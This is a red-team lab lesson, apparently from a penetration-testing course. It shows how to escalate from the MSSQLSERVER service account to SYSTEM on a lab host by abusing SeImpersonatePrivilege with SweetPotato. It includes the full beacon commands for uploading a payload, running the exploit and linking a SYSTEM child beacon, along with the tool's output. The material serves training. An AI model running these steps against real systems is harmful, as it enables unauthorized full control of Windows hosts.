
### SeImpersonatePrivilege

As we saw at the end of the last lesson, the lon-db-2 SQL instance is run under the context of a service account by the name **MSSQLSERVER**.

```powershell
beacon> getuid
[*] You are NT Service\MSSQLSERVER
```

This is a type of local virtual account that can access network resources using the credentials of the computer account, but their local permissions on the computer itself is limited by design (i.e. they are not local admins).

However, these accounts do often have interesting token privileges that can be abused for privilege escalation.  This is not limited to MS SQL but can also be found on accounts that run other services, such as Internet Information Services (IIS).  Tools like Seatbelt, or even running `whoami /priv`, will return a list of token privileges that are enabled or available to be enabled.

![[Pasted image 20250723093943.png]]

This can be exploited using a tool such as [SweetPotato](https://github.com/CCob/SweetPotato).  This works by creating a named pipe and coercing a SYSTEM process into connecting to it.  It then impersonates the access token of that SYSTEM process and uses it to spawn another arbitrary process as SYSTEM.  This effectively requires us to execute a program that exists on disk.

```powershell
beacon> cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\tcp-local_x64.exe
beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"

SweetPotato by @_EthicalChaos_
  Orignal RottenPotato code and exploit by @foxglovesec
  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
  PrintSpoofer discovery and original exploit by @itm4n
  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
[+] Attempting NP impersonation using method PrintSpoofer to launch C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe
[+] Triggering notification on evil PIPE \\lon-db-2/pipe/a708be26-b7fe-44a6-a29a-74f2583980ec
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

beacon> connect localhost 1337
[+] established link to child beacon: 10.10.120.25
```

![[Pasted image 20250723094001.png]]